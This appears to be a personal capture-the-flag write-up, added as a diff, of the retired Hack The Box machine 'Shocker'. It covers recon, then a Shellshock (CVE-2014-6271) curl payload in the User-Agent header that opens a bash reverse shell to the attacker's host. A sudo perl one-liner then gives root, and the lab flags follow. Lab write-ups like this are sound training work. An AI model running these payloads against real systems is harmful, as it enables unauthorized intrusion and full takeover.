@@ -1,0 +1,81 @@
+# HTB: Shocker
+- Date completed: August 4, 2025
+- Difficulty: Easy (Retired)
+- Summary: CGI Shellshock exploit for foothold -> GTFObins sudo perl for privesc
+
+#RECON
+
+kali@kali:~/HTB/CTF/Sh0ck3r/Nmap-Scan$ sudo nmap -sS --top-ports 1000 10.129.212.156
+
+PORT     STATE SERVICE
+80/tcp   open  http
+
+- Navigating to the open port revealed an image, so I then moved to dirbust:
+
+kali@kali:~/HTB/CTF/Sh0ck3r/Nmap-Scan$ feroxbuster -w /usr/share/wordlists/dirb/common-php.txt -u http://10.129.212.156
+
+[####################] - 11s     9234/9234    849/s   http://10.129.212.156/cgi-bin/
+
+- Running another scan being that cgi-bin gave me a forbidden error:
+
+kali@kali:~/HTB/CTF/Sh0ck3r/Nmap-Scan$ feroxbuster -w /usr/share/wordlists/dirb/common-php.txt -u http://10.129.212.156/cgi-bin/ -x .cgi,.sh,.pl
+
+200      GET        7l       18w      118c http://10.129.212.156/cgi-bin/user.sh
+
+- Curling this revealed it was a script that seemed to be executing uptime command.
+
+- Checking exploit-db for cgi bash revealed a shellshock exploit.
+
+#FOOTHOLD
+
+- Given the behavior of user.sh, I suspected the server was vulnerable to CVE-2014-6271 (Shellshock). I crafted a payload targeting the User-Agent header, resulting in a reverse shell:
+
+kali@kali:~/HTB/CTF/Sh0ck3r/Nmap-Scan$ curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.249/443 0>&1"' http://10.129.212.156/cgi-bin/user.sh
+
+^^^(Reverse Shell Payload (Shellshock via User-Agent))^^^
+
+- On the listener:
+
+kali@kali:~/HTB/CTF/Sh0ck3r/Nmap-Scan$ nc -nvlp 443                                                  
+
+shelly@Shocker:/usr/lib/cgi-bin$
+
+- Getting user.txt:
+
+shelly@Shocker:/home/shelly$ cat user.txt
+
+a51092114c5ab9530a8f270fdcbad712
+
+#PRIVESC
+
+- Running sudo -l revealed shelly could run sudo perl:
+
+shelly@Shocker:/home/shelly$ sudo -l
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+- GTFObins had sudo perl one liner to own this box:
+
+shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
+
+#PWNED
+
+shelly@Shocker:/$whoami
+
+root
+
+- Getting the root.txt file:
+
+shelly@Shocker:/$cat /root/root.txt
+
+e9d25f6566d1ed120a57a6647bdf3844
+
+#FLAGS
+
+user.txt : a51092114c5ab9530a8f270fdcbad712
+root.txt : e9d25f6566d1ed120a57a6647bdf3844
+
+#SUMMARY
+
+This box had a Shellshock vulnerability, because the cgi-bin directory was executing scripts. Which I could manipulate via curl to achieve a reverse shell. Running sudo -l, showed shelly could run sudo perl. Providing a straightforward way to achieve root.
